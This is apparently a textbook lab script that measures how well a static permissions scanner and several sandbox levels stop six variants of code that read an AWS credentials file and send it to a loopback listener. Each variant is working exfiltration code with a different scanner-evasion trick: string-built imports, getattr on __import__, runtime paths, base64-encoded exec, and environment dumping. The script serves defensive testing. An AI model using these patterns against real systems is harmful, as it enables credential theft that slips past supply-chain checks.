#!/usr/bin/env python3
"""Chapter 27, lab 5: the observed-permissions check of Chapter 26 against six ways of writing the same exfiltration, then the same six programs on R1 and on R3.
Each program reads the host's credentials file and sends it to the loopback listener.  The scan is `supplychain.observed_permissions` + `undeclared` against a declaration of 'nothing'.
Judge: did the canary arrive at the listener.  Writes results/ch27_evasion_box.json and .log"""
import sys, os, json, tempfile
from pathlib import Path
here = Path(__file__).resolve().parent; sys.path.insert(0, str(here))
from bulwark.sandbox import run_code, Manifest, Limits
from bulwark.supplychain import observed_permissions, undeclared
from ch27_world import World, CAN
def variants(W):
    H = W.home; P = W.port
    return {
     "V0 plain urllib, literal path": f"import urllib.request\nd=open({H!r}+'/.aws/credentials').read()\nurllib.request.urlopen(urllib.request.Request('http://127.0.0.1:{P}/x',data=d.encode()),timeout=2)",
     "V1 importlib and a built host": f"import importlib\nm=importlib.import_module('url'+'lib.request')\nd=open({H!r}+'/.aws/credentials').read()\nh='127.0.'+'0.1'\nm.urlopen(m.Request('http://'+h+':{P}/x',data=d.encode()),timeout=2)",
     "V2 builtin import by getattr": f"s=getattr(__builtins__,'__imp'+'ort__')('socket')\nd=open({H!r}+'/.aws/credentials').read()\nc=s.create_connection(('127.0.0.1',{P}),2);c.sendall(d.encode())",
     "V3 path built at run time": f"import os,socket\np=os.path.join(os.environ.get('HOME','/'),'.aws','credentials')\nd=open(p).read()\nc=socket.create_connection(('127.0.0.1',{P}),2);c.sendall(d.encode())",
     "V4 exec of an encoded body": f"import base64\nexec(base64.b64decode(base64.b64encode(b\"import socket\\nd=open({H!r}+'/.aws/credentials').read()\\nc=socket.create_connection(('127.0.0.1',{P}),2);c.sendall(d.encode())\")))",
     "V5 whole environment, no names": f"import os,socket\nd=repr(dict(os.environ))+open({H!r}+'/.aws/credentials').read()\nc=socket.create_connection(('127.0.0.1',{P}),2);c.sendall(d.encode())",
    }
def main():
    W = World(); out = []
    try:
        for name, code in variants(W).items():
            d = tempfile.mkdtemp(dir=W.root); os.makedirs(d + "/scripts"); open(d + "/scripts/run.py", "w").write(code)
            obs = observed_permissions(d); und = undeclared({"network": [], "shell": False, "fs": [], "env": []}, obs)
            row = dict(variant=name, scan_flags=und)
            for rung in ("R0", "R1", "R3"):
                W.hits.clear()
                x = run_code(rung, code, W.task, Limits(), manifest=Manifest(), host_env=W.host_env, env={"HOME": W.home})
                row[rung] = any(CAN["home"] in dd for _, dd in W.hits)
            out.append(row); print(row, flush=True)
    finally: W.close()
    L = ["variant".ljust(36) + "scan flags it   reached the listener on R0 / R1 / R3"]
    for r in out: L.append(r["variant"].ljust(36) + ("yes: " + ",".join(r["scan_flags"])[:40] if r["scan_flags"] else "NO").ljust(40) + f"{'yes' if r['R0'] else 'no'} / {'yes' if r['R1'] else 'no'} / {'yes' if r['R3'] else 'no'}")
    L.append(f"scan flagged {sum(bool(r['scan_flags']) for r in out)} of {len(out)}; credentials reached the listener: R0 {sum(r['R0'] for r in out)}, R1 {sum(r['R1'] for r in out)}, R3 {sum(r['R3'] for r in out)}")
    print("\n".join(L)); json.dump(out, open(here / "results/ch27_evasion_box.json", "w"), indent=1); open(here / "results/ch27_evasion_box.log", "w").write("\n".join(L) + "\n")
if __name__ == "__main__": main()
